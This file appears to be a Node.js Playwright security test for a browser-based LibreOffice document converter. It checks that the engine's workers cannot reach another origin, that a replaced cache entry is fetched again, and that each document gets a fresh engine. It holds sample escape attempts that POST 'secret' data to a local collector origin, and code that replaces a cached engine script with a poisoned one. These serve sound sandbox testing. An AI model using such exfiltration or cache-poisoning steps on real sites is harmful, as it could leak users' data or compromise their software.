#!/usr/bin/env node
/* Security test: what a document that took over the engine could still do.
 *
 * Serves web/ like GitHub Pages does, plus a "collector" on another origin that counts
 * every request it gets, and checks in headless Chromium that
 *   - the engine's workers (the engine worker and LibreOffice's threads) have no network,
 *     storage or messaging APIs left, and the Content Security Policy blocks requests to
 *     other origins even with code that kept a reference to fetch;
 *   - a cached engine file that was replaced is not served on the next visit (a new service
 *     worker instance), but downloaded again;
 *   - every document gets a fresh engine, shared only by jobs for the same document.
 *
 *   node test/security.cjs
 */
'use strict';

const fs = require('fs');
const http = require('http');
const path = require('path');
const { chromium } = require('playwright');

const ROOT = path.resolve(process.env.WEB_ROOT || path.join(__dirname, '..', 'web'));
const FIXTURES = path.join(__dirname, 'fixtures');
const PREFIX = '/serverless-office-converter/';
// Only served by this test: a worker script that the service worker takes for the engine
// worker (same path, so it gets the engine's policy) and that reports what it can still reach.
const PROBE = PREFIX + 'office-converter/engine-worker.js';

const MIME = {
    '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.mjs': 'text/javascript',
    '.css': 'text/css', '.json': 'application/json', '.wasm': 'application/wasm',
    '.svg': 'image/svg+xml',
};

function listen(server) {
    return new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve(server)));
}

function serveSite() {
    return listen(http.createServer((req, res) => {
        const url = new URL(req.url, 'http://x');
        if (url.pathname === PROBE && url.searchParams.has('collector')) {
            res.writeHead(200, { 'Content-Type': 'text/javascript' });
            res.end(`'use strict';\nconst escapeAttempts = ${escapeAttempts};\n`
                + `(${probe})(${JSON.stringify(url.searchParams.get('collector'))});`);
            return;
        }
        if (!url.pathname.startsWith(PREFIX)) return res.writeHead(404).end();
        let rel = decodeURIComponent(url.pathname.slice(PREFIX.length)) || 'index.html';
        if (rel.endsWith('/')) rel += 'index.html';
        const file = path.join(ROOT, rel);
        if (!file.startsWith(ROOT) || !fs.existsSync(file) || fs.statSync(file).isDirectory()) {
            return res.writeHead(404).end('not found');
        }
        res.writeHead(200, { 'Content-Type': MIME[path.extname(file)] || 'application/octet-stream' });
        fs.createReadStream(file).pipe(res);
    }));
}

// Another origin that would gladly accept anything (CORS and CORP allow every origin).
function serveCollector(hits) {
    return listen(http.createServer((req, res) => {
        if (req.method !== 'OPTIONS') hits.push(req.method + ' ' + req.url);
        res.writeHead(200, {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': '*',
            'Access-Control-Allow-Headers': '*',
            'Cross-Origin-Resource-Policy': 'cross-origin',
            'Content-Type': 'text/javascript',
        });
        res.end('');
    }));
}

// Runs in the engine's workers: tries the usual ways out.  Returns
// {api: 'gone' | 'present'} for the APIs and {attempt: 'blocked' | 'allowed: ...'}.
async function escapeAttempts(collector, savedFetch) {
    const out = {};
    for (const name of ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'indexedDB',
                        'caches', 'BroadcastChannel', 'importScripts']) {
        out[name] = name in self ? 'present' : 'gone';
    }
    out['navigator.storage'] = 'storage' in self.navigator ? 'present' : 'gone';
    out['navigator.serviceWorker'] = 'serviceWorker' in self.navigator ? 'present' : 'gone';
    const attempt = async (label, fn) => {
        try {
            const r = await fn();
            out[label] = 'allowed: ' + String(r).slice(0, 60);
        } catch (e) {
            out[label] = 'blocked';
        }
    };
    const f = savedFetch || self.fetch;
    if (f) {
        await attempt('fetch other origin', () => f(collector + '/fetch?d=secret').then((r) => r.status));
        await attempt('POST other origin', () => f(collector + '/post', { method: 'POST', body: 'secret' })
            .then((r) => r.status));
        await attempt('fetch own origin outside lo/', () => f(new URL('../index.html', self.location.href))
            .then((r) => r.status));
    }
    if (self.XMLHttpRequest) {
        await attempt('XHR other origin', () => {
            const xhr = new XMLHttpRequest();
            xhr.open('GET', collector + '/xhr', false);
            xhr.send();
            return xhr.status;
        });
    }
    if (self.WebSocket) {
        await attempt('WebSocket other origin', () => new Promise((resolve, reject) => {
            const ws = new WebSocket(collector.replace('http', 'ws') + '/ws');
            ws.onopen = () => resolve('open');
            ws.onerror = () => reject(new Error('error'));
        }));
    }
    if (self.importScripts) {
        await attempt('importScripts other origin', () => importScripts(collector + '/script.js'));
    }
    await attempt('blob: worker', () => new Promise((resolve, reject) => {
        const w = new Worker(URL.createObjectURL(new Blob(['postMessage(1)'])));
        w.onmessage = () => resolve('ran');
        w.onerror = () => reject(new Error('error'));
    }));
    return out;
}

// The probe worker: escape attempts with the policy only, then after lockdown.js.
function probe(collector) {
    const savedFetch = self.fetch;
    (async () => {
        const policy = await escapeAttempts(collector);
        const allowed = await savedFetch(new URL('lo/manifest.json', self.location.href))
            .then((r) => r.status, (e) => 'blocked');
        importScripts('lockdown.js');
        self.lockDownEngineWorker({ scripts: true });
        const lockedDown = await escapeAttempts(collector, savedFetch);
        postMessage({ policy, allowed, lockedDown });
    })().catch((e) => postMessage({ error: String(e) }));
}

async function main() {
    const site = await serveSite();
    const hits = [];
    const collectorServer = await serveCollector(hits);
    // localhost and 127.0.0.1 are different origins.
    const collector = `http://localhost:${collectorServer.address().port}`;
    const base = `http://127.0.0.1:${site.address().port}${PREFIX}`;

    const browser = await chromium.launch();
    const page = await browser.newPage();
    page.on('pageerror', (e) => console.log('[pageerror]', e.message));
    await page.goto(base);
    await page.waitForFunction(() => window.crossOriginIsolated === true, null, { timeout: 30000 });
    await page.evaluate(() => window.officeConverter.engine.start());

    let failed = 0;
    const check = (ok, label, detail = '') => {
        if (!ok) failed++;
        console.log(`${ok ? 'PASS' : 'FAIL'}  ${label}${detail ? ' ' + detail : ''}`);
    };

    // The collector works: the page itself (no policy) can reach it.
    await page.evaluate((c) => fetch(c + '/control').then((r) => r.status), collector);
    check(hits.length === 1, 'control: the page can reach the collector', JSON.stringify(hits));
    hits.length = 0;

    // 1. The policy alone, and lockdown.js on top of it, in a worker from the engine's directory.
    const probeResult = await page.evaluate((url) => new Promise((resolve) => {
        const w = new Worker(url);
        w.onmessage = (e) => resolve(e.data);
        w.onerror = (e) => resolve({ error: e.message || 'worker error' });
    }), `${PROBE}?collector=${encodeURIComponent(collector)}`).catch((e) => ({ error: String(e) }));
    if (probeResult.error) {
        check(false, 'probe worker', probeResult.error);
    } else {
        const blocked = (r) => Object.entries(r).filter(([k]) => / other origin|outside|blob:/.test(k));
        for (const [k, v] of blocked(probeResult.policy)) check(v === 'blocked', `policy: ${k}`, v);
        check(probeResult.allowed === 200, 'policy: the engine files are still reachable', String(probeResult.allowed));
        for (const [k, v] of Object.entries(probeResult.lockedDown)) {
            if (/ other origin|outside|blob:/.test(k)) check(v === 'blocked', `lockdown: ${k}`, v);
            else check(v === 'gone', `lockdown: ${k}`, v);
        }
    }

    // 2. The real engine: its worker and LibreOffice's threads.
    const engineWorkers = page.workers().filter((w) => /engine-worker\.js|lo-pthread\.js/.test(w.url()));
    const kinds = new Set();
    for (const worker of engineWorkers) {
        const kind = /engine-worker/.test(worker.url()) ? 'engine worker' : 'LibreOffice thread';
        const result = await Promise.race([
            worker.evaluate(`(${escapeAttempts})(${JSON.stringify(collector)})`),
            new Promise((r) => setTimeout(() => r(null), 5000)), // a thread blocked in a wait
        ]).catch((e) => ({ error: String(e) }));
        if (!result) continue;
        kinds.add(kind);
        const bad = Object.entries(result).filter(([k, v]) => v !== 'gone' && v !== 'blocked'
            && !(kind === 'LibreOffice thread' && k === 'importScripts'));
        check(!bad.length, `${kind}: no network, storage or messaging`, bad.length ? JSON.stringify(bad) : '');
    }
    check(kinds.has('engine worker') && kinds.has('LibreOffice thread'),
          'engine workers inspected', `${[...kinds].join(', ')} (${engineWorkers.length} workers)`);
    // Nothing a worker did reached the other origin.
    await new Promise((r) => setTimeout(r, 500));
    check(hits.length === 0, 'nothing reached the other origin', JSON.stringify(hits));

    // 3. A cached engine file that was replaced is not used on the next visit.
    const original = await page.evaluate(async () => {
        const name = (await caches.keys()).find((n) => n.startsWith('lo-assets-'));
        const cache = await caches.open(name);
        const key = (await cache.keys()).find((r) => r.url.endsWith('/lo/soffice.js'));
        const text = await (await cache.match(key)).text();
        await cache.put(key, new Response('throw new Error("POISONED");', {
            headers: { 'Content-Type': 'text/javascript' },
        }));
        return text;
    });
    // A later visit: the browser has stopped the service worker in the meantime.
    const cdp = await page.context().newCDPSession(page);
    await cdp.send('ServiceWorker.enable');
    await cdp.send('ServiceWorker.stopAllWorkers');
    const poison = await page.evaluate(async (original) => {
        const name = (await caches.keys()).find((n) => n.startsWith('lo-assets-'));
        const cache = await caches.open(name);
        const key = (await cache.keys()).find((r) => r.url.endsWith('/lo/soffice.js'));
        const engine = window.officeConverter.engine;
        engine.stop('test');
        let started = true;
        try {
            await engine.start();
        } catch (e) {
            started = String(e);
        }
        await new Promise((r) => setTimeout(r, 1000)); // the service worker re-caches in the background
        const now = await (await cache.match(key)).text();
        return { started, restored: now === original };
    }, original);
    check(poison.started === true, 'replaced cache entry: the engine still starts', String(poison.started));
    check(poison.restored, 'replaced cache entry: downloaded and cached again');

    // 4. A fresh engine per document; a document's jobs share one.
    const isolation = await page.evaluate(async (files) => {
        const engine = window.officeConverter.engine;
        const make = ([name, b64]) => new File([Uint8Array.from(atob(b64), (c) => c.charCodeAt(0))], name);
        const [a, b] = files.map(make);
        const run = async (file, target) => {
            await engine.convertFile(file, target);
            return engine.worker;
        };
        const a1 = await run(a, 'png');
        const a2 = await run(a, 'pdf');
        const b1 = await run(b, 'pdf');
        const a3 = await run(a, 'pdf');
        return { sameDocShares: a1 === a2, otherDocFresh: b1 !== a2, backToFirstFresh: a3 !== b1 && a3 !== a1 };
    }, ['sample.docx', 'sample.xlsx'].map((n) => [n, fs.readFileSync(path.join(FIXTURES, n)).toString('base64')]));
    check(isolation.sameDocShares, 'isolation: jobs for the same document share an engine');
    check(isolation.otherDocFresh, 'isolation: another document gets a fresh engine');
    check(isolation.backToFirstFresh, 'isolation: an engine is never reused for a document after another');

    await browser.close();
    site.close();
    collectorServer.close();
    console.log(failed ? `${failed} check(s) failed` : 'all security checks passed');
    process.exit(failed ? 1 : 0);
}

main().catch((e) => {
    console.error(e);
    process.exit(1);
});
